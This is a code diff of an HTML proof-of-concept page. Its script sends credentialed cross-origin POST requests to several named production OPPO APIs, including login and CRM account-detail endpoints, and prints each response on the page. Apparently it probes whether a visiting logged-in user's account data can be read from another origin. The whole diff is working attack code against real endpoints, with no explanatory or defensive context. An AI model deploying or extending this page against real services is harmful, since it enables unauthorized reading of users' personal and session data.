@@ -6,28 +6,45 @@
 <pre id="out"></pre>
 
 <script>
-fetch("https://memberapi-in.oppo.com/membercore/device/current", {
-    method: "POST",
-    credentials: "include",
-    headers: {
-        "Content-Type": "application/json;charset=UTF-8"
-    },
-    body: JSON.stringify({
-        countryCode: "IN",
-        storeViewCode: "in"
-    })
-})
-.then(async r => {
-    const text = await r.text();
+const targets = [
+  {
+    name: "member popup IN",
+    url: "https://memberapi-client-in.oppo.com/in/client/member/upgrade/popup",
+    body: {countryCode:"IN", storeViewCode:"in"}
+  },
+  {
+    name: "member popup SG",
+    url: "https://memberapi-client-sg.oppo.com/sg/client/member/upgrade/popup",
+    body: {countryCode:"SG", storeViewCode:"sg"}
+  },
+  {
+    name: "web login",
+    url: "https://memberapi-client-in.oppo.com/in/client/web/login",
+    body: {countryCode:"IN", storeViewCode:"in"}
+  },
+  {
+    name: "crm account detail",
+    url: "https://crm-api-in.oppo.com/api/2.0/user/account/detail",
+    body: {regionCode:"IN", appId:"myoppo"}
+  }
+];
 
-    document.getElementById("out").innerText =
-        "STATUS: " + r.status + "\\n\\n" + text;
-
-    console.log(text);
-})
-.catch(e => {
-    document.getElementById("out").innerText = e;
-});
+(async () => {
+  for (const t of targets) {
+    try {
+      const r = await fetch(t.url, {
+        method: "POST",
+        credentials: "include",
+        headers: {"Content-Type":"application/json;charset=UTF-8"},
+        body: JSON.stringify(t.body)
+      });
+      const text = await r.text();
+      document.body.innerHTML += `<h3>${t.name} — ${r.status}</h3><pre>${text.replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]))}</pre>`;
+    } catch (e) {
+      document.body.innerHTML += `<h3>${t.name}</h3><pre>${e}</pre>`;
+    }
+  }
+})();
 </script>
 
 </body>
